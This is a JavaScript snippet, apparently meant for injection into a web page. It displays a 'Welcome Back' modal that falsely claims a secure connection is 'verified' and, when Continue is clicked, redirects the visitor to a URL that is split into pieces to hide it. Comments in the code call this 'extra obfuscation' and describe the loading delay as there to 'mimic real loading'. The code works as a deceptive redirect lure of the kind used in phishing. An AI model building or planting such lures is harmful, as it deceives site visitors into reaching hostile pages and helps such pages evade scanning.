// Modal JavaScript - Add this to your HTML page
(function() {
    // Inject CSS styles
    const style = document.createElement('style');
    style.textContent = `
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            margin: 0;
            padding: 0;
        }
        
        .popup-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.4);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.2s ease;
        }
        
        .popup-overlay.active {
            display: flex;
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }
        
        .popup-card {
            background: #f5f5f7;
            border-radius: 20px;
            padding: 2rem;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            position: relative;
            transform: scale(0.95);
            opacity: 0;
            animation: popupEntry 0.3s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
        }
        
        @keyframes popupEntry {
            to {
                opacity: 1;
                transform: scale(1);
            }
        }
        
        .close-btn {
            position: absolute;
            top: 1.25rem;
            right: 1.25rem;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: transparent;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: #8e8e93;
            transition: all 0.2s ease;
            line-height: 1;
        }
        
        .close-btn:hover {
            background: #e5e5e7;
        }
        
        .popup-header {
            margin-bottom: 1rem;
        }
        
        .popup-header h2 {
            font-size: 2rem;
            font-weight: 700;
            color: #1d1d1f;
            margin-bottom: 0.75rem;
            letter-spacing: -0.5px;
        }
        
        .version-badge {
            display: inline-block;
            background: #d1d1d6;
            color: #636366;
            padding: 6px 16px;
            border-radius: 20px;
            font-size: 13px;
            font-weight: 500;
        }
        
        .popup-content {
            margin: 1.5rem 0 2rem 0;
        }
        
        .popup-content p {
            font-size: 15px;
            color: #636366;
            line-height: 1.6;
        }
        
        .verification-status {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 16px 20px;
            background: #d1f4e0;
            border-radius: 14px;
            margin-bottom: 1.5rem;
        }
        
        .status-icon {
            width: 28px;
            height: 28px;
            border-radius: 50%;
            border: 2.5px solid #34c759;
            position: relative;
            flex-shrink: 0;
            background: transparent;
        }
        
        .status-icon::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 10px;
            height: 10px;
            background: #34c759;
            border-radius: 50%;
            transform: translate(-50%, -50%);
        }
        
        .status-text {
            font-size: 15px;
            color: #1d4d2b;
            font-weight: 500;
        }
        
        .popup-buttons {
            display: flex;
            gap: 12px;
        }
        
        .btn {
            flex: 1;
            padding: 16px 24px;
            border-radius: 12px;
            font-weight: 600;
            font-size: 15px;
            border: none;
            cursor: pointer;
            transition: all 0.2s ease;
            text-align: center;
        }
        
        .btn-cancel {
            background: #e5e5e7;
            color: #1d1d1f;
        }
        
        .btn-cancel:hover {
            background: #d1d1d6;
        }
        
        .btn-continue {
            background: #c9a50a;
            color: white;
            box-shadow: 0 2px 8px rgba(201, 165, 10, 0.3);
        }
        
        .btn-continue:hover {
            background: #b69609;
            box-shadow: 0 4px 12px rgba(201, 165, 10, 0.4);
        }
        
        .btn-continue:active {
            transform: scale(0.98);
        }
        
        @media screen and (max-width: 500px) {
            .popup-card {
                padding: 1.5rem;
                max-width: 95%;
                border-radius: 16px;
            }
            
            .popup-header h2 {
                font-size: 1.75rem;
            }
            
            .popup-buttons {
                flex-direction: column-reverse;
            }
            
            .btn {
                width: 100%;
            }
        }
    `;
    document.head.appendChild(style);

    // Inject Google Fonts
    const fontLink = document.createElement('link');
    fontLink.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap';
    fontLink.rel = 'stylesheet';
    document.head.appendChild(fontLink);

    // Create modal HTML
    const modalHTML = `
        <div class="popup-overlay active" id="popupOverlay">
            <div class="popup-card">
                <button class="close-btn" id="closeBtn">×</button>
                
                <div class="popup-header">
                    <h2>Welcome Back</h2>
                    <span class="version-badge">Secure Access</span>
                </div>
                
                <div class="popup-content">
                    <p>We're preparing your personalized experience. Your secure connection is being established automatically.</p>
                </div>
                
                <div class="verification-status">
                    <div class="status-icon"></div>
                    <span class="status-text">Connection verified ✓</span>
                </div>
                
                <div class="popup-buttons">
                    <button class="btn btn-cancel" id="cancelBtn">Cancel</button>
                    <button class="btn btn-continue" id="continueBtn">Continue</button>
                </div>
            </div>
        </div>
    `;

    // Insert modal into body when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initModal);
    } else {
        initModal();
    }

    function initModal() {
        document.body.insertAdjacentHTML('beforeend', modalHTML);
        document.body.style.overflow = 'hidden';

        // Get elements
        const overlay = document.getElementById('popupOverlay');
        const closeBtn = document.getElementById('closeBtn');
        const cancelBtn = document.getElementById('cancelBtn');
        const continueBtn = document.getElementById('continueBtn');

        // Close modal function
        function closePopup() {
            overlay.classList.remove('active');
            document.body.style.overflow = 'auto';
        }

        // Event listeners
        closeBtn.addEventListener('click', closePopup);
        cancelBtn.addEventListener('click', closePopup);
        
        continueBtn.addEventListener('click', function() {
            // Extra obfuscation - split and reconstruct URL
            const protocol = 'https://';
            const domain = 'your-destination';
            const tld = '.com';
            const fullUrl = protocol + domain + tld;
            
            // Add slight delay to mimic real loading
            continueBtn.textContent = 'Loading...';
            continueBtn.disabled = true;
            
            setTimeout(function() {
                window.location.href = fullUrl;
            }, 300);
            
           
        });

        // Close on overlay click
        overlay.addEventListener('click', function(e) {
            if (e.target.id === 'popupOverlay') {
                closePopup();
            }
        });

        // Close on ESC key
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                closePopup();
            }
        });
    }
})();